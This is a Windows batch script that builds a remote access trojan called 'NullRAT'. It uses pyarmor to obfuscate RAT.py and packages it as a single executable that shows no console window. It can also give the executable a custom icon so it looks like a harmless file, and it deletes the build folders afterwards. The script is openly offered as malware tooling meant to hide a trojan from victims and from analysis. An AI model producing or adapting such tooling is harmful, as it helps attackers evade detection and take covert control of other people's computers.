@echo off & title NullRAT Compiler & color 2

cls & cd src\

echo     ____  ___  ____________                      _ __         
echo    / __ \/   ^|/_  __/ ____/___  ____ ___  ____  (_) /__  _____
echo   / /_/ / /^| ^| / / / /   / __ \/ __ `__ \/ __ \/ / / _ \/ ___/
echo  / _, _/ ___ ^|/ / / /___/ /_/ / / / / / / /_/ / / /  __/ /    
echo /_/ ^|_/_/  ^|_/_/  \____/\____/_/ /_/ /_/ .___/_/_/\___/_/     
echo                                       /_/                     

choice /c YN /n /m "Do you want a custom icon? (Y or N)"
if /I "%errorlevel%"=="1" (goto icon_compile) 
if /I "%errorlevel%"=="2" (goto non_icon_compile)
exit /b 1

:non_icon_compile
echo. & echo Compiling NullRAT...
echo -------------------- & echo.
pyarmor pack -e "--onefile --noconsole" RAT.py & cls 
cd dist & move *.exe ..\.. & cd .. & rmdir /s /q build\ & rmdir /s /q dist\
if %errorlevel% == 0 (echo Successfully compiled! & exit /b 0) else (echo Not compiled successfully :[ & echo. & pause & exit /b 1)

:icon_compile
echo. & echo Compiling NullRAT with icon...
echo ------------------------------ & echo.
pyarmor pack -e "--onefile --icon=custom_icon.ico --noconsole" RAT.py 
cd dist & move *.exe ..\.. & cd .. & rmdir /s /q build\ & rmdir /s /q dist\
if %errorlevel% == 0 (cls & echo Successfully compiled! & exit /b 0) else (cls & echo Not compiled successfully :[ & echo. & pause & exit /b 1)